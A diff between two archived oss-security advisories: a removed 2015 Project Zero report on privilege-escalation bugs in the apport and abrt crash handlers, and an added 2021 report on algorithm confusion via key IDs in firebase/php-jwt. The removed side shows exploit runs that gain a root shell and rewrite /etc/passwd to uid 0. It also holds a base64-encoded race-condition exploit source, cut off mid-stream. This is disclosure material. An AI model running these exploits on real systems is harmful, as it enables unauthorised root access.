@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["20080" "Tuesday" "14" "April" "2015" "06:30:41" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJw7hNxGp0PNmQbH0suVwfkgzbCsvs2Sv1OdxD+UBiraw@mail.gmail.com>" "395" "[oss-security] Problems in automatic crash analysis frameworks" nil nil nil "4" "2015041413:30:41" "[oss-security] Problems in automatic crash analysis frameworks" (number mark "        taviso@googl Apr 14  395/20080 " thread-indent "\"[oss-security] Problems in automatic crash analysis frameworks\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4592" "Wednesday" "11" "August" "2021" "06:36:25" "-0400" "Paragon Initiative Enterprises Security Team" "security@paragonie.com" nil "113" "[oss-security] firebase/php-jwt Algorithm Confusion with Key IDs" nil nil nil "8" nil nil (number mark "U       security@par Aug 11  113/4592  " thread-indent "\"[oss-security] firebase/php-jwt Algorithm Confusion with Key IDs\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] firebase/php-jwt Algorithm Confusion with Key IDs" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1703 invoked by uid 550); 14 Apr 2015 13:31:20 -0000
+Received: (qmail 28438 invoked by uid 550); 11 Aug 2021 10:36:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,432 +11,152 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 1663 invoked from network); 14 Apr 2015 13:31:14 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to:content-type;
-        bh=LGBOOgsuRMUzW9mUQ4YjcDqrNQkx14G0yCG2aGdQXfM=;
-        b=VyRn3b/cZE9LcTPIt9JYlfHy872TNeqdSKT/mEG+1tNc8GFaWfUlQvRv4rRhh4WT61
-         3qwl5L/e0QStoJ8UzWCGRgoIX+kZlrBDlxsga8rbXkjavG9SsthKlFofZ00XTNdrp9Kf
-         41YPLjoH+I4Rz6q/t+Pymx+2+BnP37JKwQn+Y19nWaiG5FBQT6VRsVMMWYHd5HCvIzSB
-         0NA6YjO3gtlrr/oXH+M9UiUNqj+yTYTBxHU+9z3qWXSVLKR5a+Ua4P7ADOTAFSDjz8bV
-         9dThd72BBcdxaZC2Fag+AHyAJLKzrJDlokwMkv5XabqNg/0mpywqODEQfHlIAXE7fyOB
-         63uQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
-         :content-type;
-        bh=LGBOOgsuRMUzW9mUQ4YjcDqrNQkx14G0yCG2aGdQXfM=;
-        b=Z3mCdkwDSQrT8PUEQKxwgLhdo5i7TimOvrZlW8iteIJE2fpUBqY2qYrzWw5pDaGQOh
-         s2TXcJFCrTld0b9xE1SQPu68pbtn/DGrmb56Oo24PyhaImY2a51HnnA+1BvlWoSJDy4K
-         pK5FQae5vBXDifB/+SfGiTcuWowueS094b/M74tjrzgobAyLDdxoIy3wlc8egAHgCnkn
-         fAuXnf23NcrZ2DAFOnIFuQ4aIPls0iUNVUaC/yNJaALwiCl8JFH5IviDKwYkjwbNEV3Y
-         h5zLDUc5QmfeICIkGN8is258tyv0H4ftVqEUfLkRmjl7jmiEvli2nweUrIC6fn0et5dl
-         yLrA==
-X-Gm-Message-State: ALoCoQn1X7hT29hF46CkKxj0EtJFPcnNNUer4NXOel4SqP8ZbXKOeXM+2IcaJ7sdSEanS3UnzA5s
-X-Received: by 10.140.81.39 with SMTP id e36mr8029549qgd.10.1429018262192;
- Tue, 14 Apr 2015 06:31:02 -0700 (PDT)
-MIME-Version: 1.0
-Message-ID: <CAJ_zFkJw7hNxGp0PNmQbH0suVwfkgzbCsvs2Sv1OdxD+UBiraw@mail.gmail.com>
-Content-Type: multipart/mixed; boundary=001a11c13c46e6b39a0513af3d2e
-Date: Tue, 14 Apr 2015 06:30:41 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Problems in automatic crash analysis frameworks
+Received: (qmail 28396 invoked from network); 11 Aug 2021 10:36:49 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=paragonie-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=BJ8IaL4svh7cmqfxhH+WI7gIJfK76UkdS1lzKAmabVs=;
+        b=PEjicZH9mMttTZ0N0JwhVtBHoA+M5F8gaMXag4hew0Ht3LRIyzyw29VIlzUs6RuKaa
+         pBy9+AJz1ifT5P7npTmqd01wmfN1WTtE0Dgdw0U8hOpyJWUgpmw5ERYDGosqTXKPlkPf
+         qBUlenm5j8H+4sruFSzOzZNh/ciuNIoy73jnw6QnAbjIoqumW/Cqw3PxOuP7uN2gXcGP
+         QWQq8pmGA4ixBT7zGFy0cJYE/7oNVu3fzBbR58KRlFeikKpY0OvFjL6OTRP3X/PQnNwk
+         3y84uX4JFNKQeNQ3Dy1udCNxY+RyFJ3/gzmIkn5jW5Q+YDyEJkpgir5IeDJ2pn87QlG0
+         dgPA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=BJ8IaL4svh7cmqfxhH+WI7gIJfK76UkdS1lzKAmabVs=;
+        b=eUZzAx9EbJvy/9lTzkxpXEGuzcXxYag50dLZILDd9TAxnsgMeuIJyhjt8oe8j6gAGC
+         V33qQy3GVSwjEqKeLo+e7Z3MOKzd159q7yPPUdSn8mXzOhjXb79jP45WJJIqJs4rvX6h
+         CfxE7jQBGxRviTBDpXfAyw74KWcYRrfYXC6XYLj7X5nOBlfyqlL59akCEd9JrIWCNRh2
+         B8mC1uyCkwFjX7m9ciB4n8/SytqI76RW2NNdwPtdqO9IzadxqsRcYSyB2oFYMlgTypsL
+         BZj3XtruFXrRphLpDicBhVi+C0qXBGVDJ6ujy/ADrrq4dr92gWUAMGCa5WPo0IHLEat6
+         irJw==
+X-Gm-Message-State: AOAM533FqGVN7ciR5Q0SIxTpovs9Z/T84oqF3lJWzHq0/OayRP+kZyx9
+	tMHJ1T5ox8J7UJ/qDerayufNuoL1nvDFnbOjCgmLIpogqVZbrw==
+X-Google-Smtp-Source: ABdhPJzk/bvH/cUckXDQfE0atCCWxvT/UAe0gU3k7VL1xis/VUWgq79tUvJTeaXhmrhC3OroyEOsspEL7BZt6noN2GE=
+X-Received: by 2002:ac2:5f85:: with SMTP id r5mr8674631lfe.615.1628678197391;
+ Wed, 11 Aug 2021 03:36:37 -0700 (PDT)
+MIME-Version: 1.0
+From: Paragon Initiative Enterprises Security Team <security@paragonie.com>
+Date: Wed, 11 Aug 2021 06:36:25 -0400
+Message-ID: <CAKws9z0ZM_Vj0jE8NO6jPHaqsvnUvTdEvEY9WE_-mW871u92tQ@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Cc: fulldisclosure@seclists.org
+Content-Type: multipart/alternative; boundary="00000000000068cd0105c9463107"
+Subject: [oss-security] firebase/php-jwt Algorithm Confusion with Key IDs
 
---001a11c13c46e6b39a0513af3d2e
-Content-Type: text/plain; charset=UTF-8
+--00000000000068cd0105c9463107
+Content-Type: text/plain; charset="UTF-8"
 
-Hello, this is CVE-2015-1318 and CVE-2015-1862 (essentially the same
-bugs in two different implementations, apport and abrt respectively).
-These were discussed on the vendors list last week.
+__Background__
 
-If the first character of kern.core_pattern sysctl is a pipe, the
-kernel will invoke the specified program, and pass it the core on
-stdin. Apport (Ubuntu) and Abrt (Fedora) use this feature to analyze
-and log crashes.
+Once upon a time, the Auth0 team demonstrated several attacks against JWT
+libraries that are still found to this day. You can read about their
+research here:
+https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
 
-Since the introduction of containers, Abrt and Apport have attempted
-to transparently handle namespaces by chrooting into the same root as
-the crashing program [1] [2]. Unfortunately, this is incorrect because
-root cannot safely execve() after a chroot into a user specified
-directory.
+Or for a more fun spin on the issue, you can just check
+https://www.howmanydayssinceajwtalgnonevuln.com
 
-Furthermore, Abrt suffers from numerous race conditions and symlink
-problems from trusting unprivileged programs. For example, the code
-below (and lots of similar code) is vulnerable to a filesystem race
-where a user unlinks the file after the copy but before the chown.
+The two issues that were identified there were alg=none and substituting
+HMAC over an asymmetric alg header (RS256, PS256, ES256, etc.). We like to
+distinguish the two by referring to the alg=none as a Downgrade Attack, and
+the other as Algorithm Confusion (even though, strictly speaking, they're
+both examples of Algorithm Confusion).
 
-https://github.com/abrt/abrt/blob/master/src/hooks/abrt-hook-ccpp.c#L634
+Now let's talk about Firebase's PHP-JWT Library.
 
-        strcpy(source_filename + source_base_ofs, "maps");
-        strcpy(dest_base, FILENAME_MAPS);
-        copy_file(source_filename, dest_filename, DEFAULT_DUMP_DIR_MODE);
-        IGNORE_RESULT(chown(dest_filename, dd->dd_uid, dd->dd_gid));
+__PHP-JWT__
 
-This code trusts various symlinks in /tmp without validation:
+To their credit, the Firebase team attempts to side-step the Algorithm
+Confusion issue:
+https://github.com/firebase/php-jwt/blob/d2113d9b2e0e349796e72d2a63cf9319100382d2/src/JWT.php#L103-L108
 
-https://github.com/abrt/abrt/blob/master/src/hooks/abrt-hook-ccpp.c#L806
+The above code will check the alg header of a token and make sure it's in
+the allow-list of acceptable algorithm identifiers. If the developer
+talking to this library hard-codes support for only RS256, you can't just
+swap an alg header.
 
-        char *java_log = xasprintf("/tmp/jvm-%lu/hs_error.log", (long)pid);
-        int src_fd = open(java_log, O_RDONLY);
-        free(java_log);
+But then there's this:
+https://github.com/firebase/php-jwt/blob/d2113d9b2e0e349796e72d2a63cf9319100382d2/src/JWT.php#L114-L123
 
-This code trusts the /proc/pid/exe symlink, even though it is possible
-to link it anywhere you want.
+If you provide a `kid` header, the key is retrieved from the associative
+array. Since keys are just strings (which means your HMAC keys can be
+extremely weak passwords), there is no mechanism to prevent a very silly
+form of misuse.
 
-https://github.com/abrt/abrt/blob/master/src/hooks/abrt-hook-ccpp.c#L368
+Imagine you have two different endpoints. (This can also work against
+middleware, but two different endpoints is easier to visualize.)
 
-        sprintf(buf, "/proc/%lu/exe", (long)pid);
-        int src_fd_binary = open(buf, O_RDONLY); /* might fail and
-return -1, it's ok */
+The first endpoint expects HS256 tokens, because of some JWT-based
+middleware (e.g. tamper-proof session IDs), and rejects any other algorithm.
+The second is an OAuth2/OIDC processor that expects RS256, and rejects any
+other algorithm.
 
-This code trusts the attacker controlled root symlink and copies files from it.
+Now imagine you implement these requirements with a common PHP framework
+design: Dependency injection of a configuration object in both places
+derived from a single file.
 
-https://github.com/abrt/libreport/blob/master/src/lib/dump_dir.c#L671
+If you have the same map of "key id" => "key material" in both endpoints,
+then attacking this is trivial: Instead of swapping the alg header, just
+swap the kid header, and now you've confused an asymmetric public key for a
+symmetric shared key. Oops!
 
-        if (chroot_dir)
-            copy_file_from_chroot(dd, FILENAME_OS_INFO_IN_ROOTDIR,
-chroot_dir, "/etc/os-release");
+Github issue: https://github.com/firebase/php-jwt/issues/351
+Proposed patch: https://github.com/firebase/php-jwt/pull/352
+Proof of Concept (demo app with exploit code):
+https://github.com/firebase/php-jwt/files/6966712/php-jwt-poc.zip
 
-This instructs librpm to trust an unprivileged root symlink:
+__Timeline__
 
-https://github.com/abrt/abrt/blob/master/src/daemon/rpm.c#L184
+2021-08-03 - Issue identified in response to a Reddit question (link:
+https://www.reddit.com/r/PHP/comments/owuuem/paseto_v200_released_lengthy_release_notes/h7me0p2/
+)
+2021-08-04 - Given no security vulnerability reporting information on the
+firebase/php-jwt repository, we published it on a Github issue
+2021-08-04 - Pull request with patch sent
+2021-08-06 - Github issue bumped, still no response
+2021-08-10 - We identify and notify several of the more than 1100 open
+source PHP libraries that depend on firebase/php-jwt that may be affected
+by this issue
+2021-08-11 - Proof-of-Concept shared on the Github issue
+2021-08-11 - Immediate mitigation published at
+https://github.com/paragonie/php-jwt-guard
+2021-08-11 - Email sent to oss-security@ and fulldisclosure@
 
-        if (rpmtsSetRootDir(*ts, rootdir_or_NULL) != 0)
-        {
-            rpmtsFree(*ts);
-            return -1;
-        }
+__Mitigations__
 
-And so on.
+If you aren't using this library in the exact way that's vulnerable, it's a
+non-issue. But if you are, it could be a critical vulnerability in your
+application. Not fun.
 
-There are other automatic crash analysis scripts, I believe systemd
-also has one - I haven't looked at it all.
+For the time being, consider only supporting one cryptography key in each
+distinct JWT::decode() code path.
 
-WORKAROUND
+If you MUST use Key IDs with JWT, we wrote a library that wraps
+Firebase's library and applies the security mitigation we proposed in #352:
+https://github.com/paragonie/php-jwt-guard
 
-I highly recommend setting `sysctl -w kern.core_pattern=core`.
+We will maintain our wrapper library for as long as we have to, but if the
+PHP community ends up not needing it, all the better.
 
-EXPLOITATION
+__Long-Term Remediation__
 
-Two demonstration exploits are attached.
+If you don't need JWT in particular, consider PASETO for your applications
+instead:
 
-The file `newpid.c` should produce a root shell on Fedora 20 or Ubuntu
-by invoking the crash handler inside an unprivileged chroot (possible
-since kernel 3.8).
+- https://github.com/paragonie/paseto
+-
+https://github.com/paseto-standard/paseto-spec/blob/master/docs/02-Implementation-Guide/03-Algorithm-Lucidity.md
 
- $ gcc -static newpid.c
- $ ./a.out
- uid=0(root) gid=0(root) groups=0(root)
- sh-4.3# exit
- exit
+If you need JWT because of compatibility with a third party, look into
+https://github.com/lcobucci/jwt instead of firebase/php-jwt.
 
-The file `raceabrt.c` should make you the owner of any file on Fedora
-by racing the Abrt report creation.
+That's all from us right now.
 
- $ cat /etc/fedora-release
- Fedora release 21 (Twenty One)
- $ ./a.out /etc/passwd
- Detected ccpp-2015-04-13-17:40:31-5506.new, attempting to race...
-   [ wait a few minutes ]
-   exploit successful...
- -rw-r--r--. 1 taviso abrt 2421 Apr 13 11:15 /etc/passwd
+Security Team
+Paragon Initiative Enterprises <https://paragonie.com/security>
 
-In case it isn't obvious, you can then give yourself uid zero.
-
- $ getent passwd taviso
- taviso:x:1000:1000:Tavis Ormandy:/home/taviso:/bin/bash
- $ vi /etc/passwd
- $ getent passwd taviso
- taviso:x:0:0:Tavis Ormandy:/home/taviso:/bin/bash
- $ su taviso
- Password:
- # id
- uid=0(root) gid=0(root) groups=0(root)
- exit
-
-REFERENCES
-
-[1] https://code.launchpad.net/~stgraber/apport/pidns-support/+merge/200893
-[2] https://github.com/abrt/abrt/pull/810
-[3] http://man7.org/linux/man-pages/man7/user_namespaces.7.html
-
-CREDIT
-
-Tavis Ormandy, Google Project Zero.
-
---001a11c13c46e6b39a0513af3d2e
-Content-Type: text/x-csrc; charset=US-ASCII; name="raceabrt.c"
-Content-Disposition: attachment; filename="raceabrt.c"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_i8hc4niw0
-
-I2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNs
-dWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8
-c2lnbmFsLmg+CiNpbmNsdWRlIDxlcnIuaD4KI2luY2x1ZGUgPHN0cmluZy5o
-PgojaW5jbHVkZSA8YWxsb2NhLmg+CiNpbmNsdWRlIDxsaW1pdHMuaD4KI2lu
-Y2x1ZGUgPHN5cy9pbm90aWZ5Lmg+CiNpbmNsdWRlIDxzeXMvcHJjdGwuaD4K
-I2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+
-CiNpbmNsdWRlIDxzeXMvd2FpdC5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4K
-Ci8vCi8vIFRoaXMgaXMgYSByYWNlIGNvbmRpdGlvbiBleHBsb2l0IGZvciBD
-VkUtMjAxNS0xODYyLCB0YXJnZXRpbmcgRmVkb3JhLgovLwovLyBOb3RlOiBJ
-dCBjYW4gdGFrZSBhIGZldyBtaW51dGVzIHRvIHdpbiB0aGUgcmFjZSBjb25k
-aXRpb24uCi8vCi8vICAgLS0gdGF2aXNvQGNtcHhjaGc4Yi5jb20sIEFwcmls
-IDIwMTUuCi8vCi8vICQgY2F0IC9ldGMvZmVkb3JhLXJlbGVhc2UgCi8vIEZl
-ZG9yYSByZWxlYXNlIDIxIChUd2VudHkgT25lKQovLyAkIC4vYS5vdXQgL2V0
-Yy9wYXNzd2QKLy8gWyB3YWl0IGEgZmV3IG1pbnV0ZXMgXQovLyBEZXRlY3Rl
-ZCBjY3BwLTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxODMubmV3LCBhdHRlbXB0
-aW5nIHRvIHJhY2UuLi4KLy8gICAgIERpZG4ndCB3aW4sIHRyeWluZyBhZ2Fp
-biEKLy8gRGV0ZWN0ZWQgY2NwcC0yMDE1LTA0LTEzLTIxOjU0OjQzLTE0MTg2
-Lm5ldywgYXR0ZW1wdGluZyB0byByYWNlLi4uCi8vICAgICBEaWRuJ3Qgd2lu
-LCB0cnlpbmcgYWdhaW4hCi8vIERldGVjdGVkIGNjcHAtMjAxNS0wNC0xMy0y
-MTo1NDo0My0xNDE5MS5uZXcsIGF0dGVtcHRpbmcgdG8gcmFjZS4uLgovLyAg
-ICAgRGlkbid0IHdpbiwgdHJ5aW5nIGFnYWluIQovLyBEZXRlY3RlZCBjY3Bw
-LTIwMTUtMDQtMTMtMjE6NTQ6NDMtMTQxOTUubmV3LCBhdHRlbXB0aW5nIHRv
-IHJhY2UuLi4KLy8gICAgIERpZG4ndCB3aW4sIHRyeWluZyBhZ2FpbiEKLy8g
-RGV0ZWN0ZWQgY2NwcC0yMDE1LTA0LTEzLTIxOjU0OjQzLTE0MTk4Lm5ldywg
-YXR0ZW1wdGluZyB0byByYWNlLi4uCi8vICAgICBFeHBsb2l0IHN1Y2Nlc3Nm
-dWwuLi4KLy8gLXJ3LXItLXItLS4gMSB0YXZpc28gYWJydCAxNzUxIFNlcCAy
-NiAgMjAxNCAvZXRjL3Bhc3N3ZAovLwoKc3RhdGljIGNvbnN0IGNoYXIga0Fi
-cnRQcmVmaXhbXSA9ICIvdmFyL3RtcC9hYnJ0LyI7CnN0YXRpYyBjb25zdCBz
-aXplX3Qga01heEV2ZW50QnVmID0gODE5MjsKc3RhdGljIGNvbnN0IHNpemVf
-dCBrVW5saW5rQXR0ZW1wdHMgPSA4MTkyICogMjsKc3RhdGljIGNvbnN0IGlu
-dCBrQ3Jhc2hEZWxheSA9IDEwMDAwOwoKc3RhdGljIHBpZF90IGNyZWF0ZV9h
-YnJ0X2V2ZW50cyhjb25zdCBjaGFyICpuYW1lKTsKCmludCBtYWluKGludCBh
-cmdjLCBjaGFyICoqYXJndikKewogICAgaW50IGZkLCBpOwogICAgaW50IHdh
-dGNoOwogICAgcGlkX3QgY2hpbGQ7CiAgICBzdHJ1Y3Qgc3RhdCBzdGF0YnVm
-OwogICAgc3RydWN0IGlub3RpZnlfZXZlbnQgKmV2OwogICAgY2hhciAqZXZl
-bnRidWYgPSBhbGxvY2Eoa01heEV2ZW50QnVmKTsKICAgIHNzaXplX3Qgc2l6
-ZTsKCiAgICAvLyBGaXJzdCBhcmd1bWVudCBpcyB0aGUgZmlsZW5hbWUgdXNl
-ciB3YW50cyB1cyB0byBjaG93bigpLgogICAgaWYgKGFyZ2MgIT0gMikgewog
-ICAgICAgIGVycngoRVhJVF9GQUlMVVJFLCAicGxlYXNlIHNwZWNpZnkgZmls
-ZW5hbWUgdG8gY2hvd24gKGUuZy4gL2V0Yy9wYXNzd2QpIik7CiAgICB9Cgog
-ICAgLy8gVGhpcyBpcyByZXF1aXJlZCBhcyB3ZSBuZWVkIHRvIG1ha2UgZGlm
-ZmVyZW50IGNvbW0gbmFtZXMgdG8gYXZvaWQKICAgIC8vIHRyaWdnZXJpbmcg
-YWJydCByYXRlIGxpbWl0aW5nLCBzbyB3ZSBmb3JrKCkvZXhlY3ZlKCkgZGlm
-ZmVyZW50IG5hbWVzLgogICAgaWYgKHN0cmNtcChhcmd2WzFdLCAiY3Jhc2gi
-KSA9PSAwKSB7CiAgICAgICAgX19idWlsdGluX3RyYXAoKTsKICAgIH0KCiAg
-ICAvLyBTZXR1cCBpbm90aWZ5LCBhbmQgYWRkIGEgd2F0Y2ggb24gdGhlIGFi
-cnQgZGlyZWN0b3J5LgogICAgaWYgKChmZCA9IGlub3RpZnlfaW5pdCgpKSA8
-IDApIHsKICAgICAgICBlcnIoRVhJVF9GQUlMVVJFLCAidW5hYmxlIHRvIGlu
-aXRpYWxpemUgaW5vdGlmeSIpOwogICAgfQoKICAgIGlmICgod2F0Y2ggPSBp
-bm90aWZ5X2FkZF93YXRjaChmZCwga0FicnRQcmVmaXgsIElOX0NSRUFURSkp
-IDwgMCkgewogICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8g
-Y3JlYXRlIG5ldyB3YXRjaCBkZXNjcmlwdG9yIik7CiAgICB9CgogICAgLy8g
-U3RhcnQgY2F1c2luZyBjcmFzaGVzIHNvIHRoYXQgYWJydCBnZW5lcmF0ZXMg
-cmVwb3J0cy4KICAgIGlmICgoY2hpbGQgPSBjcmVhdGVfYWJydF9ldmVudHMo
-KmFyZ3YpKSA9PSAtMSkgewogICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJm
-YWlsZWQgdG8gZ2VuZXJhdGUgYWJydCByZXBvcnRzIik7CiAgICB9CgogICAg
-Ly8gTm93IHN0YXJ0IHByb2Nlc3NpbmcgaW5vdGlmeSBldmVudHMuCiAgICB3
-aGlsZSAoKHNpemUgPSByZWFkKGZkLCBldmVudGJ1Ziwga01heEV2ZW50QnVm
-KSkgPiAwKSB7CgogICAgICAgIC8vIFdlIGNhbiByZWNlaXZlIG11bHRpcGxl
-IGV2ZW50cyBwZXIgcmVhZCwgc28gY2hlY2sgZWFjaCBvbmUuCiAgICAgICAg
-Zm9yIChldiA9IGV2ZW50YnVmOyBldiA8IGV2ZW50YnVmICsgc2l6ZTsgZXYg
-PSAmZXYtPm5hbWVbZXYtPmxlbl0pIHsKICAgICAgICAgICAgY2hhciBkaXJu
-YW1lW05BTUVfTUFYXTsKICAgICAgICAgICAgY2hhciBtYXBzbmFtZVtOQU1F
-X01BWF07CiAgICAgICAgICAgIGNoYXIgY29tbWFuZFsxMDI0XTsKCiAgICAg
-ICAgICAgIC8vIElmIHRoaXMgaXMgYSBuZXcgY2NwcCByZXBvcnQsIHdlIGNh
-biBzdGFydCB0cnlpbmcgdG8gcmFjZSBpdC4KICAgICAgICAgICAgaWYgKHN0
-cm5jbXAoZXYtPm5hbWUsICJjY3BwIiwgNCkgIT0gMCkgewogICAgICAgICAg
-ICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8v
-IENvbnN0cnVjdCBwYXRobmFtZXMuCiAgICAgICAgICAgIHN0cm5jcHkoZGly
-bmFtZSwga0FicnRQcmVmaXgsIHNpemVvZiBkaXJuYW1lKTsKICAgICAgICAg
-ICAgc3RybmNhdChkaXJuYW1lLCBldi0+bmFtZSwgc2l6ZW9mIGRpcm5hbWUp
-OwoKICAgICAgICAgICAgc3RybmNweShtYXBzbmFtZSwgZGlybmFtZSwgc2l6
-ZW9mIGRpcm5hbWUpOwogICAgICAgICAgICBzdHJuY2F0KG1hcHNuYW1lLCAi
-L21hcHMiLCBzaXplb2YgbWFwc25hbWUpOwoKICAgICAgICAgICAgZnByaW50
-ZihzdGRlcnIsICJEZXRlY3RlZCAlcywgYXR0ZW1wdGluZyB0byByYWNlLi4u
-XG4iLCBldi0+bmFtZSk7CgogICAgICAgICAgICAvLyBDaGVjayBpZiB3ZSBu
-ZWVkIHRvIHdhaXQgZm9yIHRoZSBuZXh0IGV2ZW50IG9yIG5vdC4KICAgICAg
-ICAgICAgd2hpbGUgKGFjY2VzcyhkaXJuYW1lLCBGX09LKSA9PSAwKSB7CiAg
-ICAgICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwga1VubGlua0F0dGVtcHRz
-OyBpKyspIHsKICAgICAgICAgICAgICAgICAgICAvLyBXZSBuZWVkIHRvIHVu
-bGluaygpIGFuZCBzeW1saW5rKCkgdGhlIGZpbGUgdG8gd2luLgogICAgICAg
-ICAgICAgICAgICAgIGlmICh1bmxpbmsobWFwc25hbWUpICE9IDApIHsKICAg
-ICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAg
-ICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAvLyBXZSB3b24gdGhlIGZp
-cnN0IHJhY2UsIG5vdyBhdHRlbXB0IHRvIHdpbiB0aGUKICAgICAgICAgICAg
-ICAgICAgICAvLyBzZWNvbmQgcmFjZS4uLi4KICAgICAgICAgICAgICAgICAg
-ICBpZiAoc3ltbGluayhhcmd2WzFdLCBtYXBzbmFtZSkgIT0gMCkgewogICAg
-ICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAg
-ICB9CgogICAgICAgICAgICAgICAgICAgIC8vIFRoaXMgbG9va3MgZ29vZCwg
-YnV0IGRvZXNuJ3QgbWVhbiB3ZSB3b24sIGl0J3MgcG9zc2libGUKICAgICAg
-ICAgICAgICAgICAgICAvLyBjaG93bigpIG1pZ2h0IGhhdmUgaGFwcGVuZWQg
-d2hpbGUgdGhlIGZpbGUgd2FzIHVubGlua2VkLgogICAgICAgICAgICAgICAg
-ICAgIC8vCiAgICAgICAgICAgICAgICAgICAgLy8gR2l2ZSBpdCBhIGZldyBt
-aWNyb3NlY29uZHMgdG8gcnVuIGNob3duKCkuLi5qdXN0IGluIGNhc2UKICAg
-ICAgICAgICAgICAgICAgICAvLyB3ZSBkaWQgd2luLgogICAgICAgICAgICAg
-ICAgICAgIHVzbGVlcCgxMCk7CgogICAgICAgICAgICAgICAgICAgIGlmIChz
-dGF0KGFyZ3ZbMV0sICZzdGF0YnVmKSAhPSAwKSB7CiAgICAgICAgICAgICAg
-ICAgICAgICAgIGVycngoRVhJVF9GQUlMVVJFLCAidW5hYmxlIHRvIHN0YXQg
-dGFyZ2V0IGZpbGUgJXMiLCBhcmd2WzFdKTsKICAgICAgICAgICAgICAgICAg
-ICB9CgogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0YnVmLnN0X3VpZCAh
-PSBnZXR1aWQoKSkgewogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsK
-ICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGZw
-cmludGYoc3RkZXJyLCAiXHRFeHBsb2l0IHN1Y2Nlc3NmdWwuLi5cbiIpOwoK
-ICAgICAgICAgICAgICAgICAgICAvLyBXZSdyZSB0aGUgbmV3IG93bmVyLCBy
-dW4gbHMgLWwgdG8gc2hvdyB1c2VyLgogICAgICAgICAgICAgICAgICAgIHNw
-cmludGYoY29tbWFuZCwgImxzIC1sICVzIiwgYXJndlsxXSk7CiAgICAgICAg
-ICAgICAgICAgICAgc3lzdGVtKGNvbW1hbmQpOwoKICAgICAgICAgICAgICAg
-ICAgICByZXR1cm4gRVhJVF9TVUNDRVNTOwogICAgICAgICAgICAgICAgfQog
-ICAgICAgICAgICB9CgogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlx0
-RGlkbid0IHdpbiwgdHJ5aW5nIGFnYWluIVxuIik7CiAgICAgICAgfQogICAg
-fQoKICAgIGVycihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8gcmVhZCBpbm90
-aWZ5IGV2ZW50Iik7Cn0KCi8vIFRoaXMgcm91dGluZSBhdHRlbXB0cyB0byBn
-ZW5lcmF0ZSBuZXcgYWJydCBldmVudHMuIFdlIGNhbid0IGp1c3QgY3Jhc2gs
-Ci8vIGJlY2F1c2UgYWJydCBzYW5lbHkgdHJpZXMgdG8gcmF0ZSBsaW1pdCBy
-ZXBvcnQgY3JlYXRpb24sIHNvIHdlIG5lZWQgYSBuZXcKLy8gY29tbSBuYW1l
-IGZvciBlYWNoIGNyYXNoLgpzdGF0aWMgcGlkX3QgY3JlYXRlX2FicnRfZXZl
-bnRzKGNvbnN0IGNoYXIgKm5hbWUpCnsKICAgIGNoYXIgKm5ld25hbWU7CiAg
-ICBpbnQgc3RhdHVzOwogICAgcGlkX3QgY2hpbGQsIHBpZDsKCiAgICAvLyBD
-cmVhdGUgYSBjaGlsZCBwcm9jZXNzIHRvIGdlbmVyYXRlIGV2ZW50cy4KICAg
-IGlmICgoY2hpbGQgPSBmb3JrKCkpICE9IDApCiAgICAgICAgcmV0dXJuIGNo
-aWxkOwoKICAgIC8vIE1ha2Ugc3VyZSB3ZSBzdG9wIHdoZW4gcGFyZW50IGRp
-ZXMuCiAgICBwcmN0bChQUl9TRVRfUERFQVRIU0lHLCBTSUdLSUxMKTsKCiAg
-ICB3aGlsZSAodHJ1ZSkgewogICAgICAgIC8vIENob29zZSBhIG5ldyB1bnVz
